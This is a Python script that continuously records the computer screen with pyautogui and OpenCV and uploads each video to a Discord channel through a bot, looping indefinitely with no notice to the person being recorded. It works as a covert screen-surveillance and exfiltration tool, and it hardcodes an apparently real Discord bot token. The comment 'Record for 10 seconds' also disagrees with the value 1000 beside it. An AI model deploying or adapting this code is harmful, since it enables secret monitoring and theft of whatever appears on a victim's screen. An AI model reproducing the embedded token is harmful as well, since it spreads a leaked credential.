import cv2
import pyautogui
import numpy as np
import time
import discord
import asyncio

# Discord bot token and channel ID
TOKEN = 'MTIyOTcyNzIyOTM4MzI4Mjc0MQ.GPuo5j.eeiizozYP-0nDfmfj9BwQzWHBHabBp1tCI9MVQ'
CHANNEL_ID = 1229728373803323424  # Replace this with your channel ID

# Define the screen resolution
screen_width, screen_height = pyautogui.size()

# Define the codec and create VideoWriter object
fourcc = cv2.VideoWriter_fourcc(*'XVID')
out = cv2.VideoWriter('output.avi', fourcc, 20.0, (screen_width, screen_height))

# Record for 10 seconds
record_duration = 1000
start_time = time.time()
intents = discord.Intents.default()
# Initialize Discord client
client = discord.Client(intents=intents)


@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    await record_and_send()


async def send_video():
    with open('output.avi', 'rb') as f:
        video = discord.File(f)
        channel = client.get_channel(CHANNEL_ID)
        await channel.send(file=video)
    print('Video Sent to Discord')
    await channel.send('Video Sent to Discord')


async def record_and_send():
    global start_time
    while True:
        while time.time() - start_time < record_duration:
            # Capture the screen
            screenshot = pyautogui.screenshot()

            # Convert the screenshot to a numpy array
            frame = np.array(screenshot)

            # Convert RGB to BGR
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

            # Write the frame
            out.write(frame)

            # Sleep for a short interval to avoid excessive CPU usage
            await asyncio.sleep(0.1)

        # Send the recorded video to Discord
        await send_video()

        # Reset start time for next recording
        start_time = time.time()


# Run the bot
client.run(TOKEN)
